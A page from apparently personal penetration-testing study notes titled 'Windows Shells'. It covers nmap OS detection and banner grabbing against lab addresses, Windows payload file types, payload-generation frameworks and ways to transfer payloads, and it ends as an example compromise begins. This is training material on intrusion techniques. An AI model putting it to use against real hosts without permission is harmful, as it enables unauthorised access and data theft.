<span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSRF data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_1> <span class="md-nav__icon md-icon"></span> SSRF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/ssrf/ class=md-nav__link> SSRF Example </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/blind_ssrf/ class=md-nav__link> Blind SSRF Example </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/time_based_ssrf/ class=md-nav__link> Time-Based SSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_2 type=checkbox id=__nav_2_3_9_2> <label class=md-nav__link for=__nav_2_3_9_2> SSI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSI data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_2> <span class="md-nav__icon md-icon"></span> SSI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/ssi_overview/ class=md-nav__link> Overview </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssi_example/ class=md-nav__link> Example </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_3 type=checkbox id=__nav_2_3_9_3> <label class=md-nav__link for=__nav_2_3_9_3> ESI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ESI data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_3> <span class="md-nav__icon md-icon"></span> ESI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/esi_overview/ class=md-nav__link> Overview </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_4 type=checkbox id=__nav_2_3_9_4> <label class=md-nav__link for=__nav_2_3_9_4> SSTI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSTI data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_4> <span class="md-nav__icon md-icon"></span> SSTI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_intro/ class=md-nav__link> Intro </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_example1/ class=md-nav__link> SSTI Example1 </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_example2/ class=md-nav__link> SSTI Example2 </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_example3/ class=md-nav__link> SSTI Example3 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_10 type=checkbox id=__nav_2_3_10> <label class=md-nav__link for=__nav_2_3_10> File Inclusion <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Inclusion" data-md-level=3> <label class=md-nav__title for=__nav_2_3_10> <span class="md-nav__icon md-icon"></span> File Inclusion </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/intro/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_10_2 type=checkbox id=__nav_2_3_10_2> <label class=md-nav__link for=__nav_2_3_10_2> LFI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=LFI data-md-level=4> <label class=md-nav__title for=__nav_2_3_10_2> <span class="md-nav__icon md-icon"></span> LFI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/lfi/ class=md-nav__link> LFI </a> </li> <li class=md-nav__item> <a href=../../file_inclusion/lfi_to_rce/ class=md-nav__link> LFI to RCE </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_10_3 type=checkbox id=__nav_2_3_10_3> <label class=md-nav__link for=__nav_2_3_10_3> Other Techniques <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Other Techniques" data-md-level=4> <label class=md-nav__title for=__nav_2_3_10_3> <span class="md-nav__icon md-icon"></span> Other Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/other_php_wrappers/ class=md-nav__link> PHP Wrappers </a> </li> <li class=md-nav__item> <a href=../../file_inclusion/remote_file_inclusion/ class=md-nav__link> RFI </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../file_inclusion/hardening_tips/ class=md-nav__link> Hardening Tips </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_11 type=checkbox id=__nav_2_3_11 checked> <label class=md-nav__link for=__nav_2_3_11> Shells&Payloads <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Shells&amp;Payloads data-md-level=3> <label class=md-nav__title for=__nav_2_3_11> <span class="md-nav__icon md-icon"></span> Shells&Payloads </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../msfvenom/ class=md-nav__link> MSFvenom </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> Windows Shells <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> Windows Shells </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#enumerating-windows class=md-nav__link> Enumerating Windows </a> </li> <li class=md-nav__item> <a href=#bats-dlls-msi-files class=md-nav__link> Bats, DLLs, &amp; MSI Files </a> </li> <li class=md-nav__item> <a href=#payload-generation class=md-nav__link> Payload Generation </a> </li> <li class=md-nav__item> <a href=#payload-transfer-and-execution class=md-nav__link> Payload Transfer and Execution </a> </li> <li class=md-nav__item> <a href=#example-compromise class=md-nav__link> Example Compromise </a> </li> <li class=md-nav__item> <a href=#configure-the-exploit-and-payload class=md-nav__link> Configure the exploit and payload </a> </li> <li class=md-nav__item> <a href=#validate class=md-nav__link> Validate </a> </li> <li class=md-nav__item> <a href=#execute class=md-nav__link> Execute </a> </li> <li class=md-nav__item> <a href=#identify-our-shell class=md-nav__link> Identify Our Shell </a> </li> <li class=md-nav__item> <a href=#cmd-prompt-and-powershells-for-fun-and-profit class=md-nav__link> CMD-Prompt and Power[Shell]s for Fun and Profit </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../unix_linux/ class=md-nav__link> NIX Shells </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_12 type=checkbox id=__nav_2_3_12> <label class=md-nav__link for=__nav_2_3_12> Tools <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tools data-md-level=3> <label class=md-nav__title for=__nav_2_3_12> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../tools/nmap/ class=md-nav__link> Nmap </a> </li> <li class=md-nav__item> <a href=../../tools/ffuf/ class=md-nav__link> Ffuf </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4 type=checkbox id=__nav_2_4> <label class=md-nav__link for=__nav_2_4> Blue Team <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Blue Team" data-md-level=2> <label class=md-nav__title for=__nav_2_4> <span class="md-nav__icon md-icon"></span> Blue Team </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_analysis/useful_links/ class=md-nav__link> File Analysis </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2 type=checkbox id=__nav_2_4_2> <label class=md-nav__link for=__nav_2_4_2> Network Traffic Analysis <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Network Traffic Analysis" data-md-level=3> <label class=md-nav__title for=__nav_2_4_2> <span class="md-nav__icon md-icon"></span> Network Traffic Analysis </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/layers/ class=md-nav__link> Layers </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/analysis/ class=md-nav__link> Analysis </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2_3 type=checkbox id=__nav_2_4_2_3> <label class=md-nav__link for=__nav_2_4_2_3> Tcpdump <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tcpdump data-md-level=4> <label class=md-nav__title for=__nav_2_4_2_3> <span class="md-nav__icon md-icon"></span> Tcpdump </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/tcpdump_fundamentals/ class=md-nav__link> Fundamentals </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/tcpdump_packet_filtering/ class=md-nav__link> Packet Filtering </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2_4 type=checkbox id=__nav_2_4_2_4> <label class=md-nav__link for=__nav_2_4_2_4> Wireshark <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Wireshark data-md-level=4> <label class=md-nav__title for=__nav_2_4_2_4> <span class="md-nav__icon md-icon"></span> Wireshark </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/wireshark_analysis/ class=md-nav__link> Analysis </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/wireshark_advanced_usage/ class=md-nav__link> Advanced Usage </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_5 type=checkbox id=__nav_2_5> <label class=md-nav__link for=__nav_2_5> Resources <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Resources data-md-level=2> <label class=md-nav__title for=__nav_2_5> <span class="md-nav__icon md-icon"></span> Resources </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../useful_resources/links/ class=md-nav__link> Useful Links </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <div class="md-nav__link md-nav__link--index "> <a href=../../blog/ >Blog</a> <label for=__nav_3> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Blog data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_2 type=checkbox id=__nav_3_2> <label class=md-nav__link for=__nav_3_2> 2022 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2022 data-md-level=2> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> 2022 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../blog/2022/lets_connect/ class=md-nav__link> Lets Connect </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#enumerating-windows class=md-nav__link> Enumerating Windows </a> </li> <li class=md-nav__item> <a href=#bats-dlls-msi-files class=md-nav__link> Bats, DLLs, &amp; MSI Files </a> </li> <li class=md-nav__item> <a href=#payload-generation class=md-nav__link> Payload Generation </a> </li> <li class=md-nav__item> <a href=#payload-transfer-and-execution class=md-nav__link> Payload Transfer and Execution </a> </li> <li class=md-nav__item> <a href=#example-compromise class=md-nav__link> Example Compromise </a> </li> <li class=md-nav__item> <a href=#configure-the-exploit-and-payload class=md-nav__link> Configure the exploit and payload </a> </li> <li class=md-nav__item> <a href=#validate class=md-nav__link> Validate </a> </li> <li class=md-nav__item> <a href=#execute class=md-nav__link> Execute </a> </li> <li class=md-nav__item> <a href=#identify-our-shell class=md-nav__link> Identify Our Shell </a> </li> <li class=md-nav__item> <a href=#cmd-prompt-and-powershells-for-fun-and-profit class=md-nav__link> CMD-Prompt and Power[Shell]s for Fun and Profit </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1>Windows Shells</h1> <h2 id=enumerating-windows>Enumerating Windows<a class=headerlink href=#enumerating-windows title="Permanent link">&para;</a></h2> <p><strong>What are a few ways to determine if the host is likely a Windows Machine?</strong></p> <p><strong>Time To Live</strong> (TTL). A typical response from a Windows host will either be 32 or 128. A response of or around 128 is the most common response. We can utilize this value since most hosts will never be more than 20 hops away from your point of origin, so there is little chance of the TTL counter dropping into the acceptable values of another OS type.</p> <p><a href=https://subinsb.com/default-device-ttl-values/ >TTL values by OS</a></p> <p>We can also validate if host is Windows or not by using <strong>NMAP</strong>. For this example, we will utilize the <strong>-O</strong> option with verbose output <strong>-v</strong> to initialize an OS Identification scan against our target</p> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=gp>hrmns@htb[/htb]$ </span>sudo nmap -v -O <span class=m>192</span>.168.86.39
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a>
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a><span class=go>Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT</span>
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a><span class=go>Initiating ARP Ping Scan at 17:40</span>
<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a><span class=go>Scanning 192.168.86.39 [1 port]</span>
<a id=__codelineno-0-6 name=__codelineno-0-6 href=#__codelineno-0-6></a><span class=go>Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts)</span>
<a id=__codelineno-0-7 name=__codelineno-0-7 href=#__codelineno-0-7></a><span class=go>Initiating Parallel DNS resolution of 1 host. at 17:40</span>
<a id=__codelineno-0-8 name=__codelineno-0-8 href=#__codelineno-0-8></a><span class=go>Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed</span>
<a id=__codelineno-0-9 name=__codelineno-0-9 href=#__codelineno-0-9></a><span class=go>Initiating SYN Stealth Scan at 17:40</span>
<a id=__codelineno-0-10 name=__codelineno-0-10 href=#__codelineno-0-10></a><span class=go>Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports]</span>
<a id=__codelineno-0-11 name=__codelineno-0-11 href=#__codelineno-0-11></a><span class=go>Discovered open port 139/tcp on 192.168.86.39</span>
<a id=__codelineno-0-12 name=__codelineno-0-12 href=#__codelineno-0-12></a><span class=go>Discovered open port 135/tcp on 192.168.86.39</span>
<a id=__codelineno-0-13 name=__codelineno-0-13 href=#__codelineno-0-13></a><span class=go>Discovered open port 443/tcp on 192.168.86.39</span>
<a id=__codelineno-0-14 name=__codelineno-0-14 href=#__codelineno-0-14></a><span class=go>Discovered open port 445/tcp on 192.168.86.39</span>
<a id=__codelineno-0-15 name=__codelineno-0-15 href=#__codelineno-0-15></a><span class=go>Discovered open port 902/tcp on 192.168.86.39</span>
<a id=__codelineno-0-16 name=__codelineno-0-16 href=#__codelineno-0-16></a><span class=go>Discovered open port 912/tcp on 192.168.86.39</span>
<a id=__codelineno-0-17 name=__codelineno-0-17 href=#__codelineno-0-17></a><span class=go>Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports)</span>
<a id=__codelineno-0-18 name=__codelineno-0-18 href=#__codelineno-0-18></a><span class=go>Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39)</span>
<a id=__codelineno-0-19 name=__codelineno-0-19 href=#__codelineno-0-19></a><span class=go>Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)</span>
<a id=__codelineno-0-20 name=__codelineno-0-20 href=#__codelineno-0-20></a><span class=go>Host is up (0.010s latency).</span>
<a id=__codelineno-0-21 name=__codelineno-0-21 href=#__codelineno-0-21></a><span class=go>Not shown: 994 closed tcp ports (reset)</span>
<a id=__codelineno-0-22 name=__codelineno-0-22 href=#__codelineno-0-22></a><span class=go>PORT    STATE SERVICE</span>
<a id=__codelineno-0-23 name=__codelineno-0-23 href=#__codelineno-0-23></a><span class=go>135/tcp open  msrpc</span>
<a id=__codelineno-0-24 name=__codelineno-0-24 href=#__codelineno-0-24></a><span class=go>139/tcp open  netbios-ssn</span>
<a id=__codelineno-0-25 name=__codelineno-0-25 href=#__codelineno-0-25></a><span class=go>443/tcp open  https</span>
<a id=__codelineno-0-26 name=__codelineno-0-26 href=#__codelineno-0-26></a><span class=go>445/tcp open  microsoft-ds</span>
<a id=__codelineno-0-27 name=__codelineno-0-27 href=#__codelineno-0-27></a><span class=go>902/tcp open  iss-realsecure</span>
<a id=__codelineno-0-28 name=__codelineno-0-28 href=#__codelineno-0-28></a><span class=go>912/tcp open  apex-mesh</span>
<a id=__codelineno-0-29 name=__codelineno-0-29 href=#__codelineno-0-29></a><span class=go>MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)</span>
<a id=__codelineno-0-30 name=__codelineno-0-30 href=#__codelineno-0-30></a><span class=go>Device type: general purpose</span>
<a id=__codelineno-0-31 name=__codelineno-0-31 href=#__codelineno-0-31></a><span class=go>Running: Microsoft Windows 10</span>
<a id=__codelineno-0-32 name=__codelineno-0-32 href=#__codelineno-0-32></a><span class=go>OS CPE: cpe:/o:microsoft:windows_10</span>
<a id=__codelineno-0-33 name=__codelineno-0-33 href=#__codelineno-0-33></a><span class=go>OS details: Microsoft Windows 10 1709 - 1909</span>
<a id=__codelineno-0-34 name=__codelineno-0-34 href=#__codelineno-0-34></a><span class=go>Network Distance: 1 hop</span>
</code></pre></div> <p>We can see the point labeled <strong>OS CPE: cpe:/o:microsoft:windows_10</strong> and <strong>OS details: Microsoft Windows 10 1709 - 1909</strong>. Nmap made this guess based on several different metrics it derives from the TCP/IP stack. </p> <p>If you run into issues and the scans turn up little results, attempt again with the <strong>-A</strong> and <strong>-Pn</strong> options.</p> <p>More Info how this proccess works: <a href=https://nmap.org/book/man-os-detection.html>Nmap Docs</a>.</p> <p><em>Be careful of this detection method. Implementing a firewall or other security features can obscure the host or mess the results up. When possible, use more than one check to make a determination.</em></p> <p>Now that we know we are dealing with a Windows 10 host, we need to enumerate the services we can see to determine if we have a potential avenue of exploitation. To perform banner grabbing, we can use several different tools. Netcat, Nmap, and many others can perform the enumeration we need, but for this instance, we will look at a simple Nmap script called <strong>banner.nse</strong>. In a real pentest, you will want to be as thorough as possible, making sure you have the full lay of the land.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=gp>hrmns@htb[/htb]$ </span>sudo nmap -v <span class=m>192</span>.168.86.39 --script banner.nse
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a>
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a><span class=go>Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT</span>
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a><span class=go>NSE: Loaded 1 scripts for scanning.</span>
<a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a><span class=go>&lt;snip&gt;</span>
<a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a><span class=go>Discovered open port 135/tcp on 192.168.86.39</span>
<a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a><span class=go>Discovered open port 139/tcp on 192.168.86.39</span>
<a id=__codelineno-1-8 name=__codelineno-1-8 href=#__codelineno-1-8></a><span class=go>Discovered open port 445/tcp on 192.168.86.39</span>
<a id=__codelineno-1-9 name=__codelineno-1-9 href=#__codelineno-1-9></a><span class=go>Discovered open port 443/tcp on 192.168.86.39</span>
<a id=__codelineno-1-10 name=__codelineno-1-10 href=#__codelineno-1-10></a><span class=go>Discovered open port 912/tcp on 192.168.86.39</span>
<a id=__codelineno-1-11 name=__codelineno-1-11 href=#__codelineno-1-11></a><span class=go>Discovered open port 902/tcp on 192.168.86.39</span>
<a id=__codelineno-1-12 name=__codelineno-1-12 href=#__codelineno-1-12></a><span class=go>Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports)</span>
<a id=__codelineno-1-13 name=__codelineno-1-13 href=#__codelineno-1-13></a><span class=go>NSE: Script scanning 192.168.86.39.</span>
<a id=__codelineno-1-14 name=__codelineno-1-14 href=#__codelineno-1-14></a><span class=go>Initiating NSE at 18:01</span>
<a id=__codelineno-1-15 name=__codelineno-1-15 href=#__codelineno-1-15></a><span class=go>Completed NSE at 18:01, 20.11s elapsed</span>
<a id=__codelineno-1-16 name=__codelineno-1-16 href=#__codelineno-1-16></a><span class=go>Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)</span>
<a id=__codelineno-1-17 name=__codelineno-1-17 href=#__codelineno-1-17></a><span class=go>Host is up (0.012s latency).</span>
<a id=__codelineno-1-18 name=__codelineno-1-18 href=#__codelineno-1-18></a><span class=go>Not shown: 994 closed tcp ports (reset)</span>
<a id=__codelineno-1-19 name=__codelineno-1-19 href=#__codelineno-1-19></a><span class=go>PORT    STATE SERVICE</span>
<a id=__codelineno-1-20 name=__codelineno-1-20 href=#__codelineno-1-20></a><span class=go>135/tcp open  msrpc</span>
<a id=__codelineno-1-21 name=__codelineno-1-21 href=#__codelineno-1-21></a><span class=go>139/tcp open  netbios-ssn</span>
<a id=__codelineno-1-22 name=__codelineno-1-22 href=#__codelineno-1-22></a><span class=go>443/tcp open  https</span>
<a id=__codelineno-1-23 name=__codelineno-1-23 href=#__codelineno-1-23></a><span class=go>445/tcp open  microsoft-ds</span>
<a id=__codelineno-1-24 name=__codelineno-1-24 href=#__codelineno-1-24></a><span class=go>902/tcp open  iss-realsecure</span>
<a id=__codelineno-1-25 name=__codelineno-1-25 href=#__codelineno-1-25></a><span class=go>| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se</span>
<a id=__codelineno-1-26 name=__codelineno-1-26 href=#__codelineno-1-26></a><span class=go>|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t</span>
<a id=__codelineno-1-27 name=__codelineno-1-27 href=#__codelineno-1-27></a><span class=go>912/tcp open  apex-mesh</span>
<a id=__codelineno-1-28 name=__codelineno-1-28 href=#__codelineno-1-28></a><span class=go>| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto</span>
<a id=__codelineno-1-29 name=__codelineno-1-29 href=#__codelineno-1-29></a><span class=go>|_col:SOAP, MKSDisplayProtocol:VNC , ,</span>
<a id=__codelineno-1-30 name=__codelineno-1-30 href=#__codelineno-1-30></a><span class=go>MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)</span>
</code></pre></div> <hr> <h2 id=bats-dlls-msi-files>Bats, DLLs, &amp; MSI Files<a class=headerlink href=#bats-dlls-msi-files title="Permanent link">&para;</a></h2> <p>When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use.</p> <p><strong>Payload Types to consider</strong></p> <ul> <li> <p><a href=https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library>DLLs</a> A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.</p> </li> <li> <p><a href=https://commandwindows.com/batch.htm>Batch</a> Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of <strong>.bat</strong>. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.</p> </li> <li> <p><a href=https://www.guru99.com/introduction-to-vbscript.html>VBS</a> VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.</p> </li> <li> <p><a href=https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions>MSI</a> <strong>.MSI</strong> files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run <strong>msiexec</strong> to execute our file, which will provide us with further access, such as an elevated reverse shell.</p> </li> <li> <p><a href="https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1">Powershell</a> Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.</p> </li> </ul> <hr> <h2 id=payload-generation>Payload Generation<a class=headerlink href=#payload-generation title="Permanent link">&para;</a></h2> <table> <thead> <tr> <th><strong>Resource</strong></th> <th><strong>Description</strong></th> </tr> </thead> <tbody> <tr> <td><code>MSFVenom &amp; Metasploit-Framework</code></td> <td><a href=https://github.com/rapid7/metasploit-framework target=_blank rel="noopener nofollow">Source</a> MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.</td> </tr> <tr> <td><code>Payloads All The Things </code></td> <td><a href=https://github.com/swisskyrepo/PayloadsAllTheThings target=_blank rel="noopener nofollow">Source</a> Here, you can find many different resources and cheat sheets for payload generation and general methodology.</td> </tr> <tr> <td><code>Mythic C2 Framework</code></td> <td><a href=https://github.com/its-a-feature/Mythic target=_blank rel="noopener nofollow">Source</a> The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.</td> </tr> <tr> <td><code>Nishang</code></td> <td><a href=https://github.com/samratashok/nishang target=_blank rel="noopener nofollow">Soucre</a> Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.</td> </tr> <tr> <td><code>Darkarmour</code></td> <td><a href=https://github.com/bats3c/darkarmour target=_blank rel="noopener nofollow">Source</a> Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.</td> </tr> </tbody> </table> <h2 id=payload-transfer-and-execution>Payload Transfer and Execution<a class=headerlink href=#payload-transfer-and-execution title="Permanent link">&para;</a></h2> <ul> <li> <p><strong>Impacket</strong>: <a href=https://github.com/SecureAuthCorp/impacket>Impacket</a> is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with <strong>psexec</strong>, <strong>smbclient</strong>, <strong>wmi</strong>, Kerberos, and the ability to stand up an SMB server.</p> </li> <li> <p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md>Payloads All The Things</a>: is a great resource to find quick oneliners to help transfer files across hosts expediently.</p> </li> <li> <p><strong>SMB</strong>: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.</p> </li> <li> <p><strong>Remote execution via MSF</strong>: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.</p> </li> <li> <p><strong>Other Protocols</strong>: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.</p> </li> </ul> <hr> <h2 id=example-compromise>Example Compromise<a class=headerlink href=#example-compromise title="Permanent link">&para;</a></h2> <ol> <li>Enumerate the Host</li> </ol> <p>To start this time, we will utilize an Nmap scan. The enumeration portion of any exploit chain is arguably the most critical piece of the puzzle. Understanding the target and what makes it tick will raise your chances of gaining a shell.</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=gp>hrmns@htb[/htb]$ </span>nmap -v -A <span class=m>10</span>.129.201.97
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a>
